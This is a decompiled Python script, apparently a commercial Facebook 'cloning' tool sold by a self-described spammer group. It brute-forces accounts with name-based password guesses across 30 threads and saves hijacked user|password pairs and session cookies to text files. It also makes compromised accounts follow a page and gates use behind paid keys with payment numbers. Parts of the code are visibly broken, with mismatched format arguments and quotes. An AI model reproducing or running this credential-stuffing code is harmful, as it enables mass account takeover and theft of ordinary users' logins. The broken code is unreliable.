# Decompile by Mardis (Tools By Mr.RAKIB)
# Time Succes decompile : 2022-05-02 16:34:26.787649
import os
try:
    import requests
except ImportError:
  ...
  ░░   ░   ░   ▒   ░ ░░ ░  ▒ ░ ░    ░ 
   ░           ░  ░░  ░    ░   ░      
                                    ░ 
                                                                           ═══════════════════════════════════════════════════════════
            ╔═════════════════════════════════╗
            \033[1;92m║ \x1b[1;91m╔═════════════════════════════╗ \033[1;92m║
            \033[1;92m║ \x1b[1;91m║ \033[1;92mAUTHOR    : MR. RAKIB   \x1b[1;91m║ \033[1;92m║
            \033[1;92m║ \x1b[1;91m║ \033[1;92mGITHUB    : git.me/MRRAKIB-404 \x1b[1;91m║ \033[1;92m║
            \033[1;92m║ \x1b[1;91m║ \033[1;92mFACEBOCP  : MD RAKIB HOSSEN  \x1b[1;91m║ \033[1;92m║
            \033[1;92m║ \x1b[1;91m║ \033[1;92mGroup     : 5G Spammer Team \x1b[1;91m║ \033[1;92m║
            \033[1;92m║ \x1b[1;91m║ \033[1;92mWHATSAPP  : [ ERROR ]       \x1b[1;91m║ \033[1;92m║
            \033[1;92m║ \x1b[1;91m╚═════════════════════════════╝ \033[1;92m║
            \033[1;92m╚═════════════════════════════════╝
\033[1;97m═══════════════════════════════════════════════════════════
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n \x1b[1;92mTOTAL OK : \x1b[1;92m %s  \x1b[1;92mK4US4R_OK.txt' % (H, P, str(len(ok))))
	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91mK4US4R_CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r\x1b[1;92m[K4US4R] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H}[RAKIB-OK] {coki} | {pw}")
                    print("\033[0;92m┌───────────────────────────────────────────────┐")
				    print("\033[0;92m║1.Status   : Account Just Now                        ║")
				    print("\033[0;92m║2.Solution : Chack Your Id Login In Fackbook Or Lite ║")
				    print("\033[0;92m║3.UA       : Personal UA                             ║")
				    print("\033[0;92m└───────────────────────────────────────────────┘")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('RAKIB_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s[RAKIB-CP] %s | %s ' % (M, user, pw))
                        print("\033[0;92m┌───────────────────────────────────────────────┐")
				        print("\033[0;92m║1.STATUS   : ACCOUNT WITH APPROVAL LOCK        ║")
				        print("\033[0;92m║2.SOLUTION : CHECK YOUR ID LOGIN AFTER 15 DAYS ║")
				        print("\033[0;92m║3.NORMALLY : CHECK YOUR LUCK JUST NOW LOGIN    ║")
				        print("\033[0;92m║4.CLONING  : ONLY DATE + YOUR APN CHANGE       ║")
				        print("\033[0;92m└───────────────────────────────────────────────┘")
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open("RAKIB_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/FREE.FB.COM.BAHA.UDDIN', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mobile.from' + str(get)), cookies={'cookie': coki}).text
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Mr.K4US4R BANGLADESH SPAMMER
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
            ...
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Psycho Picchi Bangladesh Hacker
                    try:
                        ...
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"@123@", xz[0]+xz[1], xz[0]+"1235"]
                        else:
                            pwx = [name, xz[0]+"@123@", xz[0]+xz[1], xz[0]+"1235"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mobile.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
...
def bnsbuy():
    ...
    if to in r:
        ...
        print
        print('\rjazzcash Account Number +9660531382177\n')
        print('\rAccount Name Mr.RAKIB\n')
        print
        print
        ...
        os.system('am start https://m.me/innocent.MR.RAKIB 404?text=' + tks)
...
def bnsreg():
    ...
    print('\rTool Price 350rs\n')
    print
    print('\rjazzcash Account Number +8801612278337\n')
    print('\rAccount Name Mr.RAKIB\n')
    print
    print('\rPayment Successfully Msg Or Token Send\n')
    print
...
def Subscraption():
	...
	clear()
	print(logo)
	r1=requests.get("https://github.com/MRRAKIB-404/key-approve-/tree/main").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
